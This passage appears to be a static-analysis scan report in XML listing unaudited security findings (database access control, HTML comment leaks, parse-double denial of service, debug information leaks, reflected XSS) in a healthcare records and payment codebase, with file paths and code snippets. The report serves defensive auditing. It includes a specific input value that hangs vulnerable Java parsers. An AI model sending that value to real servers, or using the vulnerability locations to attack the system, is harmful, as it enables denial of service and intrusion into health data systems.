<FilePath>CNSI-JAR/src/com/cnsi/common/database/DbUtilImpl.java</FilePath>
<LineStart>5110</LineStart>
<Snippet>                    ResultSet.CONCUR_READ_ONLY);

            l_rsResultSet = l_stQueryStatement.executeQuery(p_sQuery);

            Date l_objQueryEndDate = null;</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="3197942B6A9D7CCFBBDD945A7581450D" ruleID="A43E6C3F-CFD4-4567-B0C9-53B846D644C6">
                            <Category>Access Control: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>Without proper access control, the method setStringAtPosition() in DbUtilImpl.java can execute a SQL statement on line 6930 that contains an attacker-controlled primary key, thereby allowing the attacker to access unauthorized records.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>DbUtilImpl.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/database/DbUtilImpl.java</FilePath>
<LineStart>6930</LineStart>
<Snippet>        {
            l_psPreparedStatement.setString(b_iToken,
                    StringUtil.restoreSpecialCharactersForPreparedStatement(
                            (String) l_sColValue));
        }</Snippet>
<TargetFunction>java.sql.PreparedStatement.setString()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>DbUtilImpl.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/database/DbUtilImpl.java</FilePath>
<LineStart>5110</LineStart>
<Snippet>                    ResultSet.CONCUR_READ_ONLY);

            l_rsResultSet = l_stQueryStatement.executeQuery(p_sQuery);

            Date l_objQueryEndDate = null;</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="725F8CC7F3AF4AD9586B0317C4DC97D7" ruleID="A43E6C3F-CFD4-4567-B0C9-53B846D644C6">
                            <Category>Access Control: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>Without proper access control, the method setIntegerAtPosition() in DbUtilImpl.java can execute a SQL statement on line 6851 that contains an attacker-controlled primary key, thereby allowing the attacker to access unauthorized records.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>DbUtilImpl.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/database/DbUtilImpl.java</FilePath>
<LineStart>6851</LineStart>
<Snippet>        else
        {
            l_psPreparedStatement.setLong(b_iToken, Long.parseLong((String)l_sColValue));
        }
    }</Snippet>
<TargetFunction>java.sql.PreparedStatement.setLong()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>DbUtilImpl.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/database/DbUtilImpl.java</FilePath>
<LineStart>5110</LineStart>
<Snippet>                    ResultSet.CONCUR_READ_ONLY);

            l_rsResultSet = l_stQueryStatement.executeQuery(p_sQuery);

            Date l_objQueryEndDate = null;</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="FB4D2E8407C8093912FB323C0B25D6E4" ruleID="A43E6C3F-CFD4-4567-B0C9-53B846D644C6">
                            <Category>Access Control: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>Without proper access control, the method preparedStmtInsert() in DbUtilImpl.java can execute a SQL statement on line 5855 that contains an attacker-controlled primary key, thereby allowing the attacker to access unauthorized records.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>DbUtilImpl.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/database/DbUtilImpl.java</FilePath>
<LineStart>5855</LineStart>
<Snippet>                        default:
                            l_psPreparedStatement.setString(b_iToken,
                                    StringUtil.restoreSpecialCharactersForPreparedStatement(
                                            l_sColValue));
</Snippet>
<TargetFunction>java.sql.PreparedStatement.setString()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>DbUtilImpl.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/database/DbUtilImpl.java</FilePath>
<LineStart>5110</LineStart>
<Snippet>                    ResultSet.CONCUR_READ_ONLY);

            l_rsResultSet = l_stQueryStatement.executeQuery(p_sQuery);

            Date l_objQueryEndDate = null;</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="1503">
                        <groupTitle>System Information Leak: HTML Comment in JSP</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>Any information revealed in the HTML comment at domaindetail.jsp line 389 could help an adversary learn about the system and form a plan of attack.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>HTML comments provide an attacker with an easy source of information about a dynamically generated web page.

Example 1:


&lt;!-- TBD: this needs a security audit --&gt;
&lt;form method="POST" action="recalcOrbit"&gt;
...


Even comments that seem innocuous may be useful to someone trying to understand the way the system is built.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Add the following configuration to your web.xml file, which will exclude HTML comments from the content sent to the user:

&lt;web-app&gt;
  ...
  &lt;context-param&gt;
      &lt;param-name&gt;facelets.SKIP_COMMENTS&lt;/param-name&gt;
      &lt;param-value&gt;true&lt;/param-value&gt;
  &lt;/context-param&gt;
  ...
</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>1503</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="077CC17159A1804D7411EA1C8D7E3FDE" ruleID="E8885AA6-C967-490A-B4DF-5F4692EF6BF5">
                            <Category>System Information Leak: HTML Comment in JSP</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Any information revealed in the HTML comment at roledetail.jsp line 339 could help an adversary learn about the system and form a plan of attack.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>roledetail.jsp</FileName>
<FilePath>EHR-WEBAPP/jsp/ehr/admin/roledetail.jsp</FilePath>
<LineStart>339</LineStart>
<Snippet>        &lt;/table&gt;
    &lt;/div&gt;
&lt;/div&gt; &lt;!-- end of templatemo_content --&gt;
&lt;/form&gt;</Snippet>
<TargetFunction>Comment()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="077CC17159A1804D7411EA1C8D7E3FDD" ruleID="E8885AA6-C967-490A-B4DF-5F4692EF6BF5">
                            <Category>System Information Leak: HTML Comment in JSP</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Any information revealed in the HTML comment at profiledetail.jsp line 434 could help an adversary learn about the system and form a plan of attack.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>profiledetail.jsp</FileName>
<FilePath>EHR-WEBAPP/jsp/ehr/admin/profiledetail.jsp</FilePath>
<LineStart>434</LineStart>
<Snippet>        &lt;/table&gt;
    &lt;/div&gt;
&lt;/div&gt; &lt;!-- end of templatemo_content --&gt;
&lt;/form&gt;</Snippet>
<TargetFunction>Comment()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="E14FBF505DC50B02A519B6B3A266A044" ruleID="E8885AA6-C967-490A-B4DF-5F4692EF6BF5">
                            <Category>System Information Leak: HTML Comment in JSP</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Any information revealed in the HTML comment at useraccountdetail.jsp line 298 could help an adversary learn about the system and form a plan of attack.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>useraccountdetail.jsp</FileName>
<FilePath>EHR-WEBAPP/jsp/ehr/admin/useraccountdetail.jsp</FilePath>
<LineStart>298</LineStart>
<Snippet>			&lt;/table&gt;
	    	&lt;div class="cleaner"&gt;&lt;/div&gt;
	    &lt;/div&gt;&lt;!-- section_w880 --&gt;
	    
	    &lt;h3&gt;&lt;a href="#"&gt;Associated Profiles&lt;/a&gt;&lt;/h3&gt;</Snippet>
<TargetFunction>Comment()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="077CC17159A1804D7411EA1C8D7E3FDC" ruleID="E8885AA6-C967-490A-B4DF-5F4692EF6BF5">
                            <Category>System Information Leak: HTML Comment in JSP</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Any information revealed in the HTML comment at pagedetail.jsp line 138 could help an adversary learn about the system and form a plan of attack.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>pagedetail.jsp</FileName>
<FilePath>EHR-WEBAPP/jsp/ehr/admin/pagedetail.jsp</FilePath>
<LineStart>138</LineStart>
<Snippet>        &lt;/table&gt;
    &lt;/div&gt;
&lt;/div&gt; &lt;!-- end of templatemo_content --&gt;
&lt;/form&gt;</Snippet>
<TargetFunction>Comment()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="077CC17159A1804D7411EA1C8D7E3FDB" ruleID="E8885AA6-C967-490A-B4DF-5F4692EF6BF5">
                            <Category>System Information Leak: HTML Comment in JSP</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Any information revealed in the HTML comment at domaindetail.jsp line 389 could help an adversary learn about the system and form a plan of attack.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>domaindetail.jsp</FileName>
<FilePath>EHR-WEBAPP/jsp/ehr/admin/domaindetail.jsp</FilePath>
<LineStart>389</LineStart>
<Snippet>        &lt;/table&gt;
    &lt;/div&gt;
&lt;/div&gt; &lt;!-- end of templatemo_content --&gt;
&lt;/form&gt;</Snippet>
<TargetFunction>Comment()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="796">
                        <groupTitle>Denial of Service: Parse Double</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The program calls the method setNumberAtPosition() that parses doubles in DbUtilImpl.java on line 6875 and can cause the thread to hang.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>There is a vulnerability in implementations ofjava.lang.Double.parseDouble() and related methods that can cause the thread to hang when parsing any number in the range [2^(-1022) - 2^(-1075) : 2^(-1022) - 2^(-1076)]. This defect can be used to execute a Denial of Service (DoS) attack.

Example 1: The following code uses a vulnerable method.

Double d = Double.parseDouble(request.getParameter("d"));


An attacker could send requests where the parameter d is a value in the range, such as "0.0222507385850720119e-00306", to cause the program to hang while processing the request.

This vulnerability exists for Java version 6 Update 23 and earlier versions. It is not present for Java version 6 Update 24 and later.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>If possible, apply the patch released by Oracle. Install patches for other vulnerable products, such as Apache Tomcat, as available. If this is not possible, be sure your installation of the Fortify Real-Time Analyzer is configured to protect against this attack.

If the vulnerable method call is within your program, you may be able to avoid using Double. However, this is not guaranteed to eliminate the issue. Other numeric classes, such as BigInteger, use the parseDouble() method in their implementation.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. You cannot eliminate the indication of this vulnerability by changing the source code. You can safely suppress this issue if you are using Java version 6 Update 24 or later.

2. Fortify RTA adds protection against this category.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>796</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="E10BABD7B647B27BF116A3FF642DCE92" ruleID="BE4C87FF-0F69-4BCE-8A4E-B7C5C6B76524">
                            <Category>Denial of Service: Parse Double</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The program calls the method calculateHospitalPayments() that parses doubles in HospPymntCalcResultRequestHandler.java on line 159 and can cause the thread to hang.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HospPymntCalcResultRequestHandler.java</FileName>
<FilePath>EHR-HOSP-JAR/src/com/ehr/web/action/HospPymntCalcResultRequestHandler.java</FilePath>
<LineStart>159</LineStart>
<Snippet>		}

		hospCalcOutput.setMdcdPatientVolPrcntg(Double.valueOf(mdcdPatientVolPrcntg));
		hospCalcOutput.setPriorYear1GrowthRate(trimDecimal(priorYear1GrowthRate));
		hospCalcOutput.setPriorYear2GrowthRate(trimDecimal(priorYear2GrowthRate));</Snippet>
<TargetFunction>java.lang.Double.valueOf()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>CNSIRequestProcessorImpl.java</FileName>
<FilePath>ECAMS-WEBAPP/src/com/ecams/common/CNSIRequestProcessorImpl.java</FilePath>
<LineStart>813</LineStart>
<Snippet>                     * Added this code to fix the defect when we close SUBMENU from any susbsytem, it should go
                     * to corresponding susbsytem MENU page instead of going My Inbox Page**/
                    l_sSubMenuClose =  p_objHttpServletRequest.getParameter(MENUCLOSEACTION_PARAMETER);
                    if(l_sTargetModuleName.equalsIgnoreCase("My Inbox") &amp;&amp;
                        	l_sTargetPageName.equalsIgnoreCase("pgMyInbox") &amp;&amp;</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="E10BABD7B647B27BF116A3FF642DCE91" ruleID="BE4C87FF-0F69-4BCE-8A4E-B7C5C6B76524">
                            <Category>Denial of Service: Parse Double</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The program calls the method calculateHospitalPayments() that parses doubles in HospPymntCalcResultRequestHandler.java on line 159 and can cause the thread to hang.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HospPymntCalcResultRequestHandler.java</FileName>
<FilePath>EHR-HOSP-JAR/src/com/ehr/web/action/HospPymntCalcResultRequestHandler.java</FilePath>
<LineStart>159</LineStart>
<Snippet>		}

		hospCalcOutput.setMdcdPatientVolPrcntg(Double.valueOf(mdcdPatientVolPrcntg));
		hospCalcOutput.setPriorYear1GrowthRate(trimDecimal(priorYear1GrowthRate));
		hospCalcOutput.setPriorYear2GrowthRate(trimDecimal(priorYear2GrowthRate));</Snippet>
<TargetFunction>java.lang.Double.valueOf()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>CNSIRequestProcessorImpl.java</FileName>
<FilePath>ECAMS-WEBAPP/src/com/ecams/common/CNSIRequestProcessorImpl.java</FilePath>
<LineStart>778</LineStart>
<Snippet>                     * Added this code to fix the defect when we close SUBMENU from any susbsytem, it should go
                     * to corresponding susbsytem MENU page instead of going My Inbox Page**/
                    l_sSubMenuClose =  p_objHttpServletRequest.getParameter(MENUCLOSEACTION_PARAMETER);
                    if(l_sSubMenuClose!=null &amp;&amp;
                	l_sSubMenuClose.equalsIgnoreCase(CNSIConstants.CLOSE_MENU_PARENT_PAGE)) {</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="7A6D2BFF079EEEEB31990A41578FA95C" ruleID="BE4C87FF-0F69-4BCE-8A4E-B7C5C6B76524">
                            <Category>Denial of Service: Parse Double</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The program calls the method setNumberAtPosition() that parses doubles in DbUtilImpl.java on line 6875 and can cause the thread to hang.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DbUtilImpl.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/database/DbUtilImpl.java</FilePath>
<LineStart>6875</LineStart>
<Snippet>        {
            l_psPreparedStatement.setDouble(b_iToken,
                    Double.parseDouble((String) l_sColValue));
        }
    }</Snippet>
<TargetFunction>java.lang.Double.parseDouble()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>DbUtilImpl.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/database/DbUtilImpl.java</FilePath>
<LineStart>5110</LineStart>
<Snippet>                    ResultSet.CONCUR_READ_ONLY);

            l_rsResultSet = l_stQueryStatement.executeQuery(p_sQuery);

            Date l_objQueryEndDate = null;</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="17C0A393C330157DFEB35A4C8EB9F468" ruleID="BE4C87FF-0F69-4BCE-8A4E-B7C5C6B76524">
                            <Category>Denial of Service: Parse Double</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The program calls the method calculateHospitalPayments() that parses doubles in HospPymntCalcResultRequestHandler.java on line 159 and can cause the thread to hang.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HospPymntCalcResultRequestHandler.java</FileName>
<FilePath>EHR-HOSP-JAR/src/com/ehr/web/action/HospPymntCalcResultRequestHandler.java</FilePath>
<LineStart>159</LineStart>
<Snippet>		}

		hospCalcOutput.setMdcdPatientVolPrcntg(Double.valueOf(mdcdPatientVolPrcntg));
		hospCalcOutput.setPriorYear1GrowthRate(trimDecimal(priorYear1GrowthRate));
		hospCalcOutput.setPriorYear2GrowthRate(trimDecimal(priorYear2GrowthRate));</Snippet>
<TargetFunction>java.lang.Double.valueOf()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>RequestSessionUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/util/RequestSessionUtil.java</FilePath>
<LineStart>492</LineStart>
<Snippet>                                            l_sGridName + CommonConstants.PIPE;
                                    l_sOperator += l_sFParameterName;
                                    l_sOperatorValue = (String) p_reqRequest.getParameter(l_sOperator);
                                    if(l_sOperatorValue == null)
                                    {</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="CC476C3D296A9E24856FCC58B7DAE46F" ruleID="BE4C87FF-0F69-4BCE-8A4E-B7C5C6B76524">
                            <Category>Denial of Service: Parse Double</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The program calls the method calculateHospitalPayments() that parses doubles in HospPymntCalcResultRequestHandler.java on line 159 and can cause the thread to hang.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HospPymntCalcResultRequestHandler.java</FileName>
<FilePath>EHR-HOSP-JAR/src/com/ehr/web/action/HospPymntCalcResultRequestHandler.java</FilePath>
<LineStart>159</LineStart>
<Snippet>		}

		hospCalcOutput.setMdcdPatientVolPrcntg(Double.valueOf(mdcdPatientVolPrcntg));
		hospCalcOutput.setPriorYear1GrowthRate(trimDecimal(priorYear1GrowthRate));
		hospCalcOutput.setPriorYear2GrowthRate(trimDecimal(priorYear2GrowthRate));</Snippet>
<TargetFunction>java.lang.Double.valueOf()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>MultipartRequest.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/multipartrequest/MultipartRequest.java</FilePath>
<LineStart>146</LineStart>
<Snippet>    	//get a list of all the items which contains the form fields and 
    	//file details
    	List l_alFileItems = l_objUploadObject.parseRequest(p_objRequest);
    	//and the list
		Iterator l_itMultipartFormIterator = l_alFileItems.iterator();</Snippet>
<TargetFunction>org.apache.commons.fileupload.servlet.ServletFileUpload.parseRequest()</TargetFunction>
                            </Source>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="718">
                        <groupTitle>System Information Leak: Internal</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The function main() in ActionMapper.java reveals system data or debug information by calling println() on line 1093. The information revealed by println() could help an adversary form a plan of attack.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>An internal information leak occurs when system data or debug information is sent to a local file, console, or screen via printing or logging.



Example 1: The following code writes an exception to the standard error stream:


try {
    ...
} catch (Exception e) {
    e.printStackTrace();
}


Depending upon the system configuration, this information can be dumped to a console, written to a log file, or exposed to a user. In some cases, the error message provides the attacker with the precise type of attack to which the system is vulnerable. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system. In Example 1, the leaked information could imply information about the type of operating system, the applications installed on the system, and the amount of care that the administrators have put into configuring the program.

Information leaks are also a concern in a mobile computing environment.

Example 2: The following code logs the stack trace of a caught exception on the Android platform.

...
try {
  ...
} catch (Exception e) {
    Log.e(TAG, Log.getStackTraceString(e));
}
...
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Write error messages with security in mind. In production environments, turn off detailed error information in favor of brief messages. Restrict the generation and storage of detailed output that can help administrators and programmers diagnose problems. Debug traces can sometimes appear in non-obvious places (embedded in comments in the HTML for an error page, for example).

Even brief error messages that do not reveal stack traces or database dumps can potentially aid an attacker. For example, an "Access Denied" message can reveal that a file or user exists on the system.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. Do not rely on wrapper scripts, corporate IT policy, or quick-thinking system administrators to prevent system information leaks. Write software that is secure on its own.

2. This category of vulnerability does not apply to all types of programs. For example, if your application executes on a client machine where system information is already available to an attacker, or if you print system information only to a trusted log file, you can use Audit Guide to filter out this category from your scan results.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>718</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="D5C65E5D064EF72DB3E3387E8DD80E61" ruleID="DCA98C06-0D99-4EE0-ADA4-A4FA86FDE47A">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>The function main() in ActionMapper.java reveals system data or debug information by calling println() on line 1093. The information revealed by println() could help an adversary form a plan of attack.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ActionMapper.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/base/ActionMapper.java</FilePath>
<LineStart>1093</LineStart>
<Snippet>    {
      e.printStackTrace();
      System.out.println("Error during creation: " + e.getMessage());
    } //catch
  } // main()</Snippet>
<TargetFunction>java.io.PrintStream.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>CNSIEncoderException.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/encoder/CNSIEncoderException.java</FilePath>
<LineStart>110</LineStart>
<Snippet>                 
               {
             	   b_sMsg += m_objChainedException.getMessage();
                }//end of if ((m_objChainedException != null)
        </Snippet>
<TargetFunction>java.lang.Throwable.getMessage()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="2AD9E4AC73683D08E10855D23DBA6C9B" ruleID="DCA98C06-0D99-4EE0-ADA4-A4FA86FDE47A">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>The function main() in ActionMapper.java reveals system data or debug information by calling println() on line 1093. The information revealed by println() could help an adversary form a plan of attack.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ActionMapper.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/base/ActionMapper.java</FilePath>
<LineStart>1093</LineStart>
<Snippet>    {
      e.printStackTrace();
      System.out.println("Error during creation: " + e.getMessage());
    } //catch
  } // main()</Snippet>
<TargetFunction>java.io.PrintStream.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ActionMapper.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/base/ActionMapper.java</FilePath>
<LineStart>1093</LineStart>
<Snippet>    {
      e.printStackTrace();
      System.out.println("Error during creation: " + e.getMessage());
    } //catch
  } // main()</Snippet>
<TargetFunction>Read e()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F5DC189CFE86769F5EBAD4EC1C0B82A7" ruleID="DCA98C06-0D99-4EE0-ADA4-A4FA86FDE47A">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>The function main() in ActionMapper.java reveals system data or debug information by calling println() on line 1093. The information revealed by println() could help an adversary form a plan of attack.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ActionMapper.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/base/ActionMapper.java</FilePath>
<LineStart>1093</LineStart>
<Snippet>    {
      e.printStackTrace();
      System.out.println("Error during creation: " + e.getMessage());
    } //catch
  } // main()</Snippet>
<TargetFunction>java.io.PrintStream.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>CNSIException.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/exception/CNSIException.java</FilePath>
<LineStart>243</LineStart>
<Snippet>                  )
               {
             	   l_sErrorMessage = m_objChainedException.getMessage();
                }//end of if ((m_objChainedException != null)
         }//end of else if (m_sErrorCode != null)</Snippet>
<TargetFunction>java.lang.Throwable.getMessage()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="4AAAF4FCB8C5DC5729BC019ECDB0375E" ruleID="DCA98C06-0D99-4EE0-ADA4-A4FA86FDE47A">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>The function main() in ActionMapper.java reveals system data or debug information by calling println() on line 1093. The information revealed by println() could help an adversary form a plan of attack.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ActionMapper.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/base/ActionMapper.java</FilePath>
<LineStart>1093</LineStart>
<Snippet>    {
      e.printStackTrace();
      System.out.println("Error during creation: " + e.getMessage());
    } //catch
  } // main()</Snippet>
<TargetFunction>java.io.PrintStream.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WsCNSIException.java</FileName>
<FilePath>ECAMS-JAR/src/com/ecams/webservices/util/WsCNSIException.java</FilePath>
<LineStart>253</LineStart>
<Snippet>                            (m_objChainedException instanceof WsCNSIException))
                   {
                       l_sErrorMessage = m_objChainedException.getMessage();
                   }//end of if ((m_objChainedException != null)
               }//end of else if (m_sErrorCode != null)</Snippet>
<TargetFunction>java.lang.Throwable.getMessage()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="840EE6A4741A1457613C2B8D4146DDD8" ruleID="DCA98C06-0D99-4EE0-ADA4-A4FA86FDE47A">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>The function main() in ActionMapper.java reveals system data or debug information by calling println() on line 1093. The information revealed by println() could help an adversary form a plan of attack.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ActionMapper.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/base/ActionMapper.java</FilePath>
<LineStart>1093</LineStart>
<Snippet>    {
      e.printStackTrace();
      System.out.println("Error during creation: " + e.getMessage());
    } //catch
  } // main()</Snippet>
<TargetFunction>java.io.PrintStream.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ActionMapper.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/base/ActionMapper.java</FilePath>
<LineStart>1093</LineStart>
<Snippet>    {
      e.printStackTrace();
      System.out.println("Error during creation: " + e.getMessage());
    } //catch
  } // main()</Snippet>
<TargetFunction>java.lang.Throwable.getMessage()</TargetFunction>
                            </Source>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="561">
                        <groupTitle>Cross-Site Scripting: Reflected</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The method doStartTag() in DisplayMsgTag.java sends unvalidated data to a web browser on line 84, which can result in the browser executing malicious code.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>Cross-site scripting (XSS) vulnerabilities occur when:

1. Data enters a web application through an untrusted source. In the case of reflected XSS, the untrusted source is typically a web request, while in the case of persisted (also known as stored) XSS it is typically a database or other back-end data store.


2. The data is included in dynamic content that is sent to a web user without validation.

The malicious content sent to the web browser often takes the form of a segment of JavaScript, but can also include HTML, Flash or any other type of code that the browser executes. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data like cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.


Example 1: The following JSP code segment reads an employee ID, eid, from an HTTP request and displays it to the user.


&lt;% String eid = request.getParameter("eid"); %&gt;
...
Employee ID: &lt;%= eid %&gt;



